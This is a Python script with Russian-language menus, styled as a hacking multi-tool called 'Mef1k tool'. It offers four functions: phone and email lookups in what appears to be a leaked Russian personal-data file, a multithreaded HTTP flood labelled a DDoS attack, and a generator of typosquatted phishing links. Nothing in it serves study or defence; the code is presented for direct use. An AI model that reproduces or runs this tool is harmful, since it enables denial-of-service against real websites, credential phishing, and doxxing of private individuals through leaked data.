import pyfiglet
import shutil
from tabulate import tabulate
import threading
import requests
import random
import string
import colorama
from colorama import Fore, Style

colorama.init(autoreset=True)

visit_detected = threading.Event()

def run_ddos_attack():
    print(Fore.GREEN + "Введите URL для DDoS атаки: ", end='')
    url = input()
    print(Fore.GREEN + "Введите количество потоков (максимум 1000): ", end='')
    num_threads = int(input())
    print(Fore.GREEN + "Введите количество запросов на поток (максимум 5000): ", end='')
    num_requests_per_thread = int(input())

    max_threads = 1000
    max_requests = 5000

    if num_threads > max_threads:
        print(Fore.GREEN + f"Количество потоков превышает допустимое значение. Установлено максимальное значение {max_threads}.")
        num_threads = max_threads

    if num_requests_per_thread > max_requests:
        print(Fore.GREEN + f"Количество запросов на поток превышает допустимое значение. Установлено максимальное значение {max_requests}.")
        num_requests_per_thread = max_requests

    create_and_start_threads(num_threads, url, num_requests_per_thread, delay=0)

def wait_for_visit():
    print(Fore.GREEN + "Waiting for someone to visit the phishing link...")
    visit_detected.wait()
    print(Fore.GREEN + "Someone visited the phishing link!")

    requests.post('http://127.0.0.1:5000/shutdown')

def create_and_start_threads(num_threads, url, num_requests_per_thread, delay):
    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=send_requests, args=(url, num_requests_per_thread, delay))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

def send_requests(url, num_requests, delay):
    for _ in range(num_requests):
        try:
            response = requests.get(url)
            print(Fore.GREEN + f"Request sent to {url}: {response.status_code}")
        except requests.RequestException as e:
            print(Fore.GREEN + f"Request to {url} failed: {e}")

def generate_phishing_url(domain, path, params=None):
    subdomain = ''.join(random.choices(string.ascii_lowercase, k=3))
    similar_domain = domain.replace('example', 'examp1e')
    
    symbol = random.choice(['-', '_', '.'])
    
    rand_num = random.randint(0, 99)
    
    if random.choice([True, False]):
        url = f"https://{subdomain}.{similar_domain}{symbol}{rand_num}{path}"
    else:
        url = f"https://{subdomain}.{similar_domain}{path}{symbol}{rand_num}"
        
    if params:
        query_string = '&'.join([f"{k}={v}" for k, v in params.items()])
        url = f"{url}?{query_string}"
    
    return url

def normalize_phone_number(phone_number):
    return ''.join(filter(str.isdigit, phone_number))

def search_txt_for_phone(file_path, phone_number):
    normalized_phone = normalize_phone_number(phone_number)
    results = []

    try:
        with open(file_path, 'r', encoding='utf-8') as txtfile:
            for line in txtfile:
                combined_data = line.strip()
                if normalized_phone in normalize_phone_number(combined_data):
                    results.append(combined_data)
    except Exception as e:
        print(Fore.GREEN + f"Произошла ошибка при поиске номеров: {e}")
    
    return results

def search_txt_for_email(file_path, email):
    results = []

    try:
        with open(file_path, 'r', encoding='utf-8') as txtfile:
            for line in txtfile:
                if email in line.strip():
                    results.append(line.strip())
    except Exception as e:
        print(Fore.GREEN + f"Произошла ошибка при поиске email: {e}")
    
    return results

def print_centered(text):
    columns = shutil.get_terminal_size().columns
    padding = (columns - len(text)) // 2
    print(Fore.GREEN + " " * padding + text)

font = pyfiglet.figlet_format("Mef1k tool", font="dos_rebel")
print(Fore.GREEN + font)

text1 = "by good"
text2 = "Версия v1"

print_centered(text1)
print()
print_centered(text2)

options = [
    ["1. Пробив по номеру", "2. Пробив почты"],
    ["3. DDoS-атака", "4. Генератор Фишинг ссылок"],
]

print(Fore.GREEN + "\n" + tabulate(options, tablefmt="fancy_grid"))

print(Fore.GREEN + "Выберите опцию:", end=' ')
user_choice = input()

if user_choice == "1":
    print(Fore.GREEN + "Введите номер для поиска в базе данных: ", end='')
    phone_number = input()
    results = search_txt_for_phone('База данных РФ.txt', phone_number)
    
    if results:
        print(Fore.GREEN + f"Результаты поиска для номера '{phone_number}':")
        for result in results:
            print(Fore.GREEN + result)
    else:
        print(Fore.GREEN + f"Нет данных для номера '{phone_number}'")

elif user_choice == "2":
    print(Fore.GREEN + "Введите email для поиска в базе данных: ", end='')
    email = input()
    results = search_txt_for_email('База данных РФ.txt', email)
    if results:
        print(Fore.GREEN + f"Результаты поиска для email '{email}':")
        for result in results:
            print(Fore.GREEN + result)
    else:
        print(Fore.GREEN + f"Нет результатов для email '{email}'")

elif user_choice == "3":
    run_ddos_attack()

elif user_choice == "4":
    print(Fore.GREEN + "Введите основной домен (например, example.com): ", end='')
    domain = input()
    print(Fore.GREEN + "Введите путь (например, /login): ", end='')
    path = input()
    params = {"user": "john_doe", "session": "abcd1234"}

    phishing_url = generate_phishing_url(domain, path, params)
    print(Fore.GREEN + f"Сгенерированная фишинговая ссылка: {phishing_url}")

    thread = threading.Thread(target=wait_for_visit)
    thread.start()
